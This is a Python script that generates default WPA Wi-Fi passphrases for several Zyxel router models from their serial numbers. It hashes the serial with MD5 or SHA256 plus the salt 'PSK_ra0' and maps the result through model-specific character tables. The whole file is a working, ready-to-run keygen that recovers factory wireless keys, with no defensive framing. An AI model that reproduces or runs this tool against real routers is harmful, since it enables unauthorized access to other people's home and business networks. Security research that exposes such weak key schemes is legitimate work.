# zykgenpy
# Zyxel VMG8823-B50B WPA Keygen
import hashlib
import argparse

def pick(haystack, charset, needle, base, max, v):
    if len(haystack) == 107:
        needle = str(needle).lower()
    i = 0
    terminate = 0
    letter = ''
    while i < max and terminate == 0:
        if haystack[i] == chr(int(needle)):
            base = base + i
            letter = charset[base % v]
            terminate = 1
        i = i + 1
    if terminate == 0:
        letter = chr(int(needle))
    return letter

def cocktail(arg):
    if arg == "c":
        return 1
    elif arg == "n":
        return 2
    elif arg == "m":
        return 3
    elif arg == "s":
        return 4
    elif arg == "g":
        return 5
    elif arg == "p":
        return 6
    else:
        return False


def zykgen_wpa(serial, passlength, cocktail, algorithm):
    # Cosmopolitan
    if cocktail == 1:
        haystack = '1234567890ilosabcdefghjkmnpqrtuvwxyz12560IOSZ3478ABCDEFGHJKLMNPQRTUVWXY125690IOSVWZ3478ABCDEFGHJKLMNPQRTUXY'
        charset = 'abcdefghjkmnpqrtuvwxyz125690IOSZ3478ABCDEFGHJKLMNPQRTUVWXY125690IOSVWZ3478ABCDEFGHJKLMNPQRTUXY'
        max_value = 14
        v = 22
    # Negroni
    if cocktail == 2:
        haystack = '125690IOSZ3478ABCDEFGHJKLMNPQRTUVWXY125690IOSVWZ3478ABCDEFGHJKLMNPQRTUXY'
        charset = '3478ABCDEFGHJKLMNPQRTUVWXY125690IOSVWZ3478ABCDEFGHJKLMNPQRTUXY'
        max_value = 10
        v = 26
    # Mojito
    if cocktail == 3:
        haystack = '125690IOSVWZ3478ABCDEFGHKLJMNPQRTUXY'
        charset = '3478ABCDEFGHJKLMNPQRTUXY'
        max_value = 12
        v = 24
    # Screw driver for videotron EM2926 and NBG4615.v2
    if cocktail == 4:
        haystack = 'B8G6I1L0OQDS5Z23479ACEFHJKMNPRTUVWXY' # invalid+valid chars
        charset = '3479ACEFHJKMNPRTUVWXY' # valid chars
        max_value = 15 # unused chars (36-v)
        v = 21 # valid chars
    # Gin and Juice  for AMG1302-T10B, AMG1202-T10B, AMG1302-T11C (ESSID ZyXEL_HHHH and italk-HHHH) AMG1302-T30D (ESSID Internet_70)
    if cocktail == 5:
        haystack = 'B8G6I1L0OQDS5Z2' # invalid chars
        charset = '3479ACEFHJKMNPRTUVWXYabcdefghijklmnopqrstuvwxyz'  # valid chars
        max_value = 15 # unused chars (36-v)
        v = 47  # valid chars
    # Pina Colada for AMG1302-T11C ESSID Post_office_XXXX serial numbers S18x and higher and VMG3925-B10B with ESSID Post_Office_HHHH
    if cocktail == 6:    
        haystack = '125680BDEFGILOQSZacegilnoq' # invalid chars
        charset = '3479ACHJKMNPRTUVWXYbdfhjkmprstuvwxyz'  # valid chars
        max_value = 26 # unused chars
        v = 36   # valid chars
        passlength = 10

    serial = serial.upper()
    if algorithm == 1:
        hashh = hashlib.md5()
    elif algorithm == 2:
        hashh = hashlib.sha256()

    hashh.update(serial.encode())
    # Append salt
    if algorithm == 1:
        salted = "%sPSK_ra0" % (hashh.hexdigest())
        newhashh = hashlib.md5()
    elif algorithm == 2:
        salted = "%sPSK_ra0" % (hashh.hexdigest()[0:32].lower())
        newhashh = hashlib.sha256()

    newhashh.update(salted.encode())
    # Do some math with the raw hash digest to get the base
    base = newhashh.digest()[0] * 256 + newhashh.digest()[1]
    # Convert to binary and flip
    binary = bin(base)[2:].zfill(16)[::-1]

    key = ""
    for i in range(passlength):
        if int(binary[i]) == 1:
            c = newhashh.digest()[i] % 26 + 65
        else:
            c = newhashh.digest()[i] % 10 + 48
        letter = pick(haystack, charset, c, base, max_value, v)
        key += letter
    print (key)


parser = argparse.ArgumentParser(description='Zykgen WPA keygen. (Zyxel VMG8823-B50B)')
parser.add_argument('serial', help='Serial Number')
parser.add_argument('cocktail', help='Cocktail to use for keygen. m = Mojito, n = Negroni, c = Cosmopolitan, s = Screw Driver, g = Gin and Juice, p = Pina Colada')
parser.add_argument('-algorithm', help='Algorithm to use. 1 = MD5, 2 = SHA256', default=1, type=int, choices={1,2})
parser.add_argument('-length', help='Password length, default is 10.', default=10, type=int)
args = parser.parse_args()

if cocktail(args.cocktail):
    zykgen_wpa(args.serial, args.length, cocktail(args.cocktail), args.algorithm)
else:
    print("Invalid cocktail. Options are m, n, c, s, g, or p. use -h for more help.")
